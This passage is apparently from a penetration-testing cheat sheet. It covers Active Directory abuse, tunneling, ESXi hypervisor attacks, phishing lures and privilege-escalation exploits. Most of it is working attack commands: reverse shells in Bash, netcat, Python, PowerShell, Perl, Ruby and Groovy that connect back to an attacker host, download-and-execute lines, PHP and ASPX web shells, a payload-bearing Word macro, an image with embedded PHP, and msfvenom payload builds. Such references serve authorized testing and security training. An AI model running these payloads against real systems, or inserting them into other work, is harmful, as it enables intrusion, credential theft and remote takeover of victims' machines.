impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>       # connect to SMB with Impacket
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>    # relay NTLM to LDAP and grant rights
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>     # enumerate delegation with hash
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>    # request delegated service ticket
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>                  # request TGT with password

export KRB5CCNAME=<USERNAME>.ccache                              # select Kerberos ccache
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass          # PsExec using Kerberos ticket
```

#### bloodyAD

```bash
# GET
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<TLD>' --type user    # list domain user objects
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<TLD>' --attr ms-DS-MachineAccountQuota    # read MAQ value
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd    # read LAPS password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get membership <USER>                                                       # Group membership determines effective user privileges.
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<sAMAccountName>'                                           # Queries a domain sAMAccountName using valid LDAP credentials.
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "Domain Admins" --attr member                                    # Lists high-privileged Domain Admin members.
# ADD
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'    # add user to group
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH    # disable preauth requirement

# SET
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'    # set AD user password
```

#### AD DNS

```bash
python3 dnstool.py -u '<DOMAIN>\<ACCOUNT>$' --hashes ':<NTLM_HASH>' -r <HOSTNAME>.<DOMAIN> -a add -d <LHOST> <DC_IP>    # add AD-integrated DNS A record
python3 dnstool.py -u '<DOMAIN>\<ACCOUNT>$' --hashes ':<NTLM_HASH>' -r <HOSTNAME>.<DOMAIN> -a remove <DC_IP>             # remove AD-integrated DNS record
nslookup <HOSTNAME>.<DOMAIN> <DC_IP>                                                                                      # verify DNS record from DC
```

#### Shadow Credentials

```bash
certipy-ad shadow auto -u '<USERNAME>@<DOMAIN>' -k -account '<ACCOUNT>$' -dc-ip <DC_IP> -target <DC_FQDN>                       # Abuses shadow credentials to obtain Kerberos auth as a target account. GenericWrite
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>    # add shadow credentials
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache    # request TGT with PFX
export KRB5CCNAME=<USERNAME>.ccache                              # use generated ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>              # recover NT hash from PKINIT key
```

#### PassTheCert

```bash
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt    # extract certificate from PFX
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key    # extract private key from PFX
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key    # modify user via certificate auth
```

#### Rubeus

```bash
.\Rubeus.exe dump /nowrap                                         # dump Kerberos tickets
.\Rubeus.exe asreproast /nowrap                                  # perform AS-REP roasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast               # perform Kerberoasting
.\Rubeus.exe tgtdeleg /nowrap                                    # request delegated TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:<CERT> /getcredentials    # request TGT with certificate
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>                            # pass Kerberos ticket
```

#### RunasCs

```bash
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>    # run reverse shell as user
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac    # run reverse shell with UAC bypass
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>    # run domain user reverse shell
```

#### Seatbelt

```bash
.\Seatbelt.exe -group=system                                      # run system-focused checks
.\Seatbelt.exe -group=all                                         # run all Seatbelt checks
```

#### PrivescCheck

```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"    # run PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"    # run extended PrivescCheck report
```

#### Account Operators Group → DCSync Path

```bash
net user <USERNAME> <PASSWORD> /add /domain                      # add domain user
net group "Exchange Windows Permissions" /add <USERNAME>         # add user to Exchange Windows Permissions
# Import PowerView, then:
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync    # grant DCSync rights
impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'             # dump domain secrets with new rights
```

#### WSUS Testing

```bash
sudo apt install pipx python3-nftables                           # install wsuks prerequisites on Debian/Kali
pipx ensurepath                                                  # ensure pipx-installed tools are in PATH
pipx install wsuks --system-site-packages                        # install WSUS testing helper in isolated environment
sudo wsuks --help                                                # show WSUS testing options
wget https://live.sysinternals.com/tools/PsExec64.exe            # download PsExec64 for authorized lab payload testing
```

#### pwncat

```bash
pwncat-cs -lp <LPORT>                                            # start pwncat listener
(local) pwncat$ download /PATH/TO/FILE/<FILE> .                  # download file from target
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE> # upload file to target
# ctrl+d = back to pwncat shell
```

#### rpcclient

```bash
rpcclient -U "" <RHOST>                                          # connect anonymously to RPC
rpcclient -U '<USERNAME>%<PASSWORD>' <RHOST> -c enumdomusers     # enumerate domain users
rpcclient -U '<USERNAME>%<PASSWORD>' <RHOST> -c "queryuser <USERNAME>"    # query user details
rpcclient -U '<USERNAME>%<PASSWORD>' <RHOST> -c "netshareenumall"    # enumerate SMB shares
```

---

### Port Forwarding & Tunneling

> **Single reference section** — use the appropriate tool based on your access.

#### Ligolo-ng (Recommended)

```bash
# On attacker
sudo ip tuntap add user $(whoami) mode tun ligolo                 # create Ligolo tunnel interface
sudo ip link set ligolo up                                       # bring Ligolo interface online
./proxy -laddr <LHOST>:443 -selfcert                             # start Ligolo proxy listener

# On target
./agent -connect <LHOST>:443 -ignore-cert                        # connect Ligolo agent to proxy

# In ligolo-ng console
session                                                          # select Ligolo agent session
[Agent] » ifconfig                                               # show agent network interfaces
sudo ip r add 172.16.1.0/24 dev ligolo                           # route internal subnet through Ligolo
[Agent] » start                                                  # start Ligolo tunnel

# Port forwarding via Ligolo
[Agent] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp    # add TCP listener forward
```

Download: https://github.com/nicocha30/ligolo-ng/releases (use v0.6.2+)

#### Chisel

```bash
# SOCKS5 / Proxychains (attacker acts as server)
./chisel server -p 9002 -reverse -v                              # start reverse Chisel server
./chisel client <LHOST>:9002 R:socks                              # create reverse SOCKS proxy

# Single port forward
./chisel server -p 9002 -reverse -v                              # start reverse Chisel server
./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000               # forward remote port to target localhost
```

#### SSH Tunneling

```bash
# Local port forward (attacker accesses target internal service)
ssh -N -L 0.0.0.0:4455:<INTERNAL_HOST>:445 <USERNAME>@<PIVOT>    # local forward to internal SMB

# Dynamic (SOCKS) — use with proxychains
ssh -N -D 0.0.0.0:9999 <USERNAME>@<PIVOT>                       # create local SOCKS proxy
# proxychains.conf: socks5 <PIVOT_IP> 9999

# Remote port forward (target calls back to attacker)
ssh -N -R 127.0.0.1:2345:<INTERNAL_HOST>:5432 <USERNAME>@<LHOST> # expose internal PostgreSQL remotely

# Remote dynamic
ssh -N -R 9998 <USERNAME>@<LHOST>                                # create remote SOCKS proxy
# proxychains.conf: socks5 127.0.0.1 9998
```

#### Socat

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432     # forward TCP port from pivot to target service
psql -h <PIVOT_IP> -p 2345 -U postgres               # connect through forwarded PostgreSQL port
```

#### sshuttle

```bash
sshuttle -r <USERNAME>@<PIVOT>:2222 10.10.100.0/24 172.16.50.0/24    # route subnets through SSH
```

#### Plink (Windows)

```bash
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <LHOST>    # reverse forward RDP through SSH
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833    # connect to forwarded RDP
```

#### Netsh (Windows)

```bash
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_IP> connectport=22 connectaddress=<INTERNAL_HOST>    # add Windows portproxy
netsh advfirewall firewall add rule name="pf_ssh" protocol=TCP dir=in localip=<PIVOT_IP> localport=2222 action=allow    # allow forwarded port
# Cleanup:
netsh advfirewall firewall delete rule name="pf_ssh"             # remove firewall rule
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<PIVOT_IP>    # remove portproxy
```

#### powercat

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"    # download powercat and spawn reverse shell
```

#### Proxychains

```bash
tail /etc/proxychains4.conf                                      # confirm proxychains configuration
proxychains nmap -vvv -sT --top-ports=20 -Pn -n <TARGET>         # scan through proxychains
proxychains smbclient -p 4455 //<TARGET>/<SHARE> -U <USERNAME> --password=<PASSWORD>    # access SMB through proxychains
```

---

### Virtualization & Hypervisor Attacks

> Research section covering lateral movement from guest VMs to ESXi hypervisor management interfaces via network misconfiguration — relevant to flat/poorly segmented networks.

#### ESXi Management Interface Ports

| Port | Service |
| --- | --- |
| 443 | vSphere Web Client / HTTPS API |
| 902 | VMware ESXi (VMRC / datastore) |
| 5989 | CIM (WBEM / hardware monitoring) |
| 8080 | vSphere SDK / HTTP API |
| 9080 | io-tunneld (older ESXi) |

#### Reachability Check from Guest VM

```bash
# Identify ESXi host IP (often the default gateway of the VM segment)
ip route                                                         # show routes and default gateway
ip neigh                                                         # show ARP neighbor table

# Port check against ESXi management interface
for port in 443 902 5989 8080; do                                # loop through ESXi management ports
    timeout 1 bash -c "</dev/tcp/<ESXi_IP>/$port" 2>/dev/null && echo "Port $port OPEN" || echo "Port $port closed"    # test one TCP port
done                                                             # finish port checks

nc -zv <ESXi_IP> 443 902 5989 8080                              # check ESXi management ports
nmap -sT -p 443,902,5989,8080 <ESXi_IP> -Pn                     # scan ESXi management ports
```

#### ESXi Fingerprinting

```bash
# Confirm ESXi via HTTP headers / banner
curl -k -I https://<ESXi_IP>/                                    # fetch HTTPS headers
curl -k https://<ESXi_IP>/ui/             # vSphere HTML5 UI
curl -k https://<ESXi_IP>/sdk/           # vSphere SDK endpoint

# CIM/WBEM enumeration (port 5989)
curl -k https://<ESXi_IP>:5989/                                  # probe CIM/WBEM endpoint

# Version disclosure
curl -sk https://<ESXi_IP>/host/environ                          # check ESXi environment disclosure
```

#### vCenter Discovery

```bash
# vCenter is often on a separate management network — look for:
# - Different IP from ESXi host
# - Port 443 with vCenter-specific paths

curl -k https://<TARGET>/ui/              # probe vSphere Client
curl -k https://<TARGET>/vsphere-client/  # probe legacy Flash client
curl -k https://<TARGET>/rest/            # probe vSphere REST API
curl -k https://<TARGET>/sdk/             # probe SOAP API

# Enumerate via DNS
dig vcenter.<DOMAIN>                                             # resolve common vCenter hostname
dig @<DNS_IP> _vlso._tcp.<DOMAIN> SRV                            # query vCenter lookup service SRV
```

#### ESXi Default Credentials

```
root:(blank)
root:vmware
root:password
root:Admin@123
dcui:(blank)
```

#### ESXi Authentication (if creds obtained)

```bash
# Login via API
curl -k -u 'root:<PASSWORD>' https://<ESXi_IP>/sdk/              # authenticate to ESXi SOAP API

# PowerCLI (Windows)
Connect-VIServer -Server <ESXi_IP> -User root -Password <PASSWORD>    # connect PowerCLI to ESXi
Get-VM                                                           # list virtual machines
Get-Datastore                                                    # list datastores
```

#### VMDK Exposure

```bash
# If datastore is accessible (port 902 or NFS/CIFS shares exposed)
# List datastores via API
curl -k -u 'root:<PASSWORD>' https://<ESXi_IP>/sdk/ --data '<SOAP_ENVELOPE>'    # send SOAP request to ESXi

# Mount VMDK locally for offline analysis
# On Linux (vmware-vdiskmanager or qemu-nbd):
sudo modprobe nbd                                                # load network block device module
sudo qemu-nbd -r -c /dev/nbd0 /path/to/disk.vmdk                 # attach VMDK read-only
sudo mount /dev/nbd0p1 /mnt/vmdk                                 # mount VMDK partition

# Extract credential files from Windows VMDK
ls /mnt/vmdk/Windows/System32/config/     # SAM, SYSTEM, SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL    # dump hashes from mounted hives
```

#### Blast Radius Assessment

```bash
# From ESXi access — enumerate all VMs
# Via esxcli (if SSH enabled on ESXi)
ssh root@<ESXi_IP>                                               # SSH to ESXi host
esxcli vm process list                                           # list running VMs
esxcli storage filesystem list                                   # list ESXi filesystems
vim-cmd vmsvc/getallvms                                          # list registered VMs
vim-cmd vmsvc/power.getstate <VMID>                              # check VM power state

# Snapshot enumeration (may contain credential material)
vim-cmd vmsvc/snapshot.get <VMID>                                # list VM snapshots
find /vmfs/volumes/ -name "*.vmem" 2>/dev/null    # VM memory snapshots
find /vmfs/volumes/ -name "*.vmsn" 2>/dev/null    # VM suspend files
```

#### ESXi Network Misconfiguration Context

```bash
# On guest VM — check if management VLAN is reachable
# Signs of flat network: ESXi mgmt IP is in same /24 as guest VM
# or gateway IP responds on port 443/902

# Test from guest VM
traceroute <ESXi_IP>                                             # check hop distance to ESXi
arp -n | grep <ESXi_IP>                                          # check local ARP visibility

# If ESXi is directly adjacent (1 hop), network is likely flat/unsegmented
```

---

### Social Engineering Tools

#### Microsoft Office Word Macro (Phishing)

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    ' Paste base64-encoded powershell payload split into 50-char chunks:
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    ' ...
    CreateObject("Wscript.Shell").Run Str
End Sub
```

```bash
# Encode payload (pwsh)
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);...'    # define PowerShell payload
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)          # convert payload to UTF-16LE bytes
[Convert]::ToBase64String($Bytes)                                # base64 encode payload
```

#### Windows Library Files (WebDAV Phishing)

```bash
pip3 install wsgidav                                             # install WebDAV server
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/webdav/    # host anonymous WebDAV share
```

```xml
<!-- config.Library-ms -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>http://<LHOST></url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

```bash
# Send phishing email with attachment
swaks --server <RHOST> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap    # send test email with attachment
```

---

## CVEs & LPE Techniques

| CVE | Description |
| --- | --- |
| CVE-2014-6271 | Shellshock RCE |
| CVE-2016-5195 | Dirty COW LPE |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE |
| CVE-2019-14287 | Sudo Bypass (`sudo -u#-1`) |
| CVE-2020-1472 | ZeroLogon PE |
| CVE-2021-3156 | Sudo/sudoedit LPE |
| CVE-2021-44228 | Log4Shell RCE |
| CVE-2022-0847 | Dirty Pipe LPE |
| CVE-2022-22963 | Spring4Shell RCE |
| CVE-2022-31214 | Firejail LPE |
| CVE-2023-21746 | LocalPotato LPE |
| CVE-2023-22809 | sudoedit LPE |
| CVE-2023-32629/2640 | GameOverlay Ubuntu Kernel LPE |
| CVE-2023-4911 | Looney Tunables LPE |
| CVE-2023-7028 | GitLab Account Takeover |
| CVE-2024-4577 | PHP-CGI RCE |

### Key LPE One-Liners

```bash
# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash                                             # bypass sudo user restriction

# CVE-2023-22809 (sudoedit)
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd                    # edit arbitrary file via sudoedit

# CVE-2023-32629 / CVE-2023-2640 (Ubuntu GameOverlay — kernel 5.19.0-46)
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'    # exploit overlayfs capability bug

# CVE-2014-6271 Shellshock
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh    # trigger Shellshock reverse shell

# GodPotato
.\GodPotato-NET4.exe -cmd '<COMMAND>'                            # execute command via GodPotato

# PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell                            # spawn SYSTEM PowerShell

# SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"    # launch reverse shell via EFSRPC abuse
```

### CVE-2020-1472: ZeroLogon

```bash
python3 zerologon_tester.py <HANDLE> <RHOST>                     # test ZeroLogon vulnerability
impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>        # dump DC secrets after ZeroLogon path
```

### MySQL UDF LPE

```bash
gcc -g -c raptor_udf2.c -fPIC                                    # compile MySQL UDF object
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc    # build MySQL UDF shared library
# In MySQL:
# use mysql; create table foo(line blob);
# insert into foo values(load_file('/PATH/TO/raptor_udf2.so'));
# select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
# create function do_system returns integer soname 'raptor_udf2.so';
# select do_system('chmod +s /bin/bash');
```

---

## Payloads & Reverse Shells

### Msfvenom

```bash
msfvenom -l payloads                                                                                   # list available payloads
msfvenom -p <PAYLOAD> --list-options                                                                   # list required payload options
msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <COUNT> LHOST=<LHOST> LPORT=<LPORT> -o <OUTPUT>      # encode payload output

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf      # Linux x86 Meterpreter reverse shell
msfvenom -p linux/x86/meterpreter/bind_tcp    RHOST=<RHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf      # Linux x86 Meterpreter bind shell
msfvenom -p linux/x64/shell_bind_tcp          RHOST=<RHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf      # Linux x64 bind shell
msfvenom -p linux/x64/shell_reverse_tcp       LHOST=<LHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf      # Linux x64 reverse shell
msfvenom -p linux/x86/shell_reverse_tcp       LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.bin      # Linux x86 raw reverse shell payload

# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe    # Windows x64 Meterpreter EXE payload
msfvenom -p windows/meterpreter/reverse_tcp     LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe    # Windows Meterpreter reverse shell
msfvenom -p windows/meterpreter/reverse_tcp     LHOST=<LHOST> LPORT=<LPORT> -f msi -o <PAYLOAD>.msi    # Windows MSI Meterpreter payload
msfvenom -p windows/meterpreter_reverse_http    LHOST=<LHOST> LPORT=<LPORT> HttpUserAgent="<USER_AGENT>" -f exe -o <PAYLOAD>.exe    # Windows Meterpreter HTTP reverse shell
msfvenom -p windows/meterpreter/bind_tcp        RHOST=<RHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe    # Windows Meterpreter bind shell
msfvenom -p windows/shell/reverse_tcp           LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe    # Windows CMD staged reverse shell
msfvenom -p windows/shell_reverse_tcp           LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe    # Windows CMD stageless reverse shell
msfvenom -p windows/shell_reverse_tcp           LHOST=<LHOST> LPORT=<LPORT> -f dll -o <PAYLOAD>.dll    # Windows DLL reverse shell payload
msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe -o <PAYLOAD>.exe                    # Windows add-user payload

# macOS
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f macho -o <PAYLOAD>.macho          # macOS x86 reverse shell
msfvenom -p osx/x86/shell_bind_tcp    RHOST=<RHOST> LPORT=<LPORT> -f macho -o <PAYLOAD>.macho          # macOS x86 bind shell

# Scripting and web formats
msfvenom -p cmd/unix/reverse_python       LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.py           # Python reverse shell
msfvenom -p cmd/unix/reverse_bash         LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.sh           # Bash reverse shell
msfvenom -p cmd/unix/reverse_perl         LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.pl           # Perl reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o <PAYLOAD>.asp        # ASP Meterpreter reverse shell
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.jsp          # JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<LHOST> LPORT=<LPORT> -f war -o <PAYLOAD>.war          # WAR reverse shell
msfvenom -p php/meterpreter_reverse_tcp   LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.php          # PHP Meterpreter reverse shell
msfvenom -p php/reverse_php               LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.php          # PHP reverse shell

# Execution and shellcode formats
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<LHOST>/<FILE>.ps1')\"" -f python    # Windows exec payload as Python shellcode
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<LHOST> LPORT=<LPORT> -f c -e x86/shikata_ga_nai -b "<BAD_CHARS>"    # C shellcode with shikata_ga_nai encoder
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<LHOST> LPORT=<LPORT> -f c -e x86/fnstenv_mov -b "<BAD_CHARS>"       # C shellcode with fnstenv_mov encoder
```

### Bash

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1                         # bash TCP reverse shell
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'               # bash reverse shell through bash -c
```

### Netcat

```bash
nc -e /bin/sh <LHOST> <LPORT>                                    # netcat reverse shell with -e
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell    # netcat reverse shell without -e
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'    # Python reverse shell
```

### PHP

```bash
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'    # PHP reverse shell
```

### PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()    # interactive PowerShell reverse shell

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"    # launch PowerShell reverse shell
```

### Perl

```bash
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'    # Perl reverse shell
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'    # Ruby reverse shell
```

### Web Shells (PHP)

```php
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

### ASPX Web Shell

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config" /></fileExtensions>
            <hiddenSegments><remove segment="web.config" /></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

### Exiftool (PHP in Image)

```bash
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg    # embed PHP payload in image comment
```

### Groovy (Jenkins)

```groovy
String host="<LHOST>";int port=<LPORT>;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Wordlists

```bash
# CeWL
cewl -d 5 -m 3 -w wordlist.txt http://<RHOST>/index.php --with-numbers    # crawl site and build wordlist

# crunch
crunch 6 6 -t foobar%%% > wordlist                              # generate patterned words
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o wordlist.txt  # generate fixed-length charset wordlist

# CUPP (interactive)
./cupp -i                                                        # generate targeted wordlist interactively

# Username Anarchy
./username-anarchy -f first,first.last,last,flast,f.last -i names.txt    # generate username permutations

# Add number suffixes
for i in {1..100}; do printf "Password@%d\n" $i >> wordlist.txt; done    # append numbered password candidates

# Mutate — remove number-only lines
sed -i '/^[0-9]*$/d' wordlist.txt                                # remove numeric-only entries
```

### Key Wordlist Paths

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

---

## Reporting

### Evidence Checklist

- Hostnames, IPs, usernames, credentials, hashes, and access paths.
- Proof screenshots or command output for initial access, privilege escalation, and lateral movement.
- Exact commands, payload filenames, listener ports, and callback IPs used.
- Vulnerability explanation, impact, remediation, and any cleanup performed.

### Evidence Commands

```bash
id && hostname -f && ip addr                                      # capture Linux user, hostname, and network context
whoami /all && hostname && ipconfig /all                          # capture Windows user, privileges, hostname, and network context
date -u                                                           # capture UTC timestamp for evidence notes
```
